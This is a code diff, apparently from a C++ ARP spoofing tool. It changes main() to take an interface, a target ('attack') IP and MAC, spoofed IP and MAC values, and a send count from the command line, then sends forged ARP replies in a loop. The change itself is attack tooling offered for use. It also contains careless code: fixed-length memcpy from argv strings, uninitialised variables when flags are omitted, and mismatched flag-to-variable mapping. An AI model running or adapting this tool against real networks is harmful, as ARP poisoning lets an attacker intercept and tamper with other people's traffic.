@@ -122,14 +122,15 @@ class arpreply: public infoHost{
 	
 };
 
-int main(void ){
-	
+int main(int argc, char* argv[]){
+	char *interface;
 	char *filename="ArpList.txt";
 	char routerIP[16];
 	char routerMac[18];
 	char dstIP[16];
 	char dstMac[18];
 	char ch;
+	int sendTimes;
 
 	ifstream fin;
 	fin.open(filename);
@@ -138,19 +139,36 @@ int main(void ){
 			cout << ch;
 		fin.close();
 	}
-
-	printf("please input Router IP\n");
-	scanf("%s",&routerIP);
-	printf("please input Router mac\n");
-	scanf("%s",&routerMac);
-	printf("please input dstIP\n");
-	scanf("%s",&dstIP);
-	printf("please input dstMac\n");
-	scanf("%s",&dstMac);
+	if (argc < 11) {
+			printf(" -I: which iterface\n -dstIP: attack IP\n -dstMac: attack Mac\n");
+			printf(" -fakeIP: spoofing IP\n -fakeMac: spoofing Mac -N: send times ");
+			return 0;
+		} else {
+		for (int i = 1; i < argc; i=i+2) {
+			if (strcmp(argv[i], "-I") == 0){
+				interface =  argv[i+1];
+			}
+			if (strcmp(argv[i], "-dstIP") == 0){
+				memcpy(routerIP, argv[i+1], 16);
+			}
+			if (strcmp(argv[i], "-dstMac") == 0){
+				memcpy(routerMac, argv[i+1], 18);
+			}
+			if (strcmp(argv[i], "-fakeIP") == 0){
+				memcpy(dstIP, argv[i+1], 16);
+			}
+			if (strcmp(argv[i], "-fakeMac") == 0){
+				memcpy(dstMac, argv[i+1], 18);
+			}
+			if (strcmp(argv[i], "-N") == 0){
+				sendTimes = atoi(argv[i+1]);
+				printf("%d\n", sendTimes);
+			}
+		}
+	}
+	arpreply s(interface, dstIP, dstMac, routerIP, routerMac);
 	
-	arpreply s("wlan0",dstIP,dstMac,routerIP,routerMac);
-	
-	for (int i=0;i<1000;i++){
+	for (int i=0; i < sendTimes; i++) {
 		printf("%d ",i);
 		s.sendreply();	
 	}
